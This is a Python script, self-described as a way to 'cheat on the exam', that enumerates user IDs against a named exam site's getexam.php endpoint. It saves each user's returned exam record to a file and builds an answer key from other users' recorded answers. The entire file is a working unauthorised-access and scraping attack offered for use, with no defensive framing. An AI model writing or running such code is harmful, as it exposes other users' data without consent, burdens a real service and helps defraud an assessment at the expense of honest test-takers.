'''
use api to cheat on the exam
'''
import json
from collections import defaultdict

import requests
import tqdm


def initialization():
    all_options = defaultdict(dict)
    # exam_id:1 use exam_type 1410
    # exam_id:2 use exam_type 1430
    # exam_id:3 use exam_type 1450
    response = requests.get(
        'http://s.ehejun.com/getexam.php?user_id=192371&exam_type=1450').json(
        )
    for question_payload in response['data']['questions']:
        question_payload = question_payload['question']

        question = question_payload['question']
        A = question_payload['A']
        B = question_payload['B']
        C = question_payload['C']
        D = question_payload['D']

        all_options[question][A['option']] = 1
        all_options[question][B['option']] = 1
        all_options[question][C['option']] = 1
        all_options[question][D['option']] = 1
    return all_options


all_options = initialization()
json.dump(all_options, open('tmp.json', 'w'))

for index, user_id in enumerate(range(199375, 1000, -1)):
    if index % 30 == 0:
        print('dump into answer.json')
        json.dump(all_options, open('answer.json', 'w'))
    try:
        response = requests.get(
            'http://s.ehejun.com/getexam.php?user_id={}&exam_type=1430'.format(
                user_id))
    except requests.exceptions.ConnectionError as e:
        continue

    if response.status_code == 200:
        response = response.json()
        if response['code'] == 200:
            for question_payload in response['data']['questions']:
                question_payload = question_payload['question']
                if 'answer' in question_payload:
                    json.dump(response, open('{}.json'.format(user_id), 'w'))
                    question = question_payload['question']
                    answer_option = question_payload['answer']
                    if not answer_option:
                        continue
                    answer_string = question_payload[answer_option]['option']

                    all_options[question][answer_string] += 1
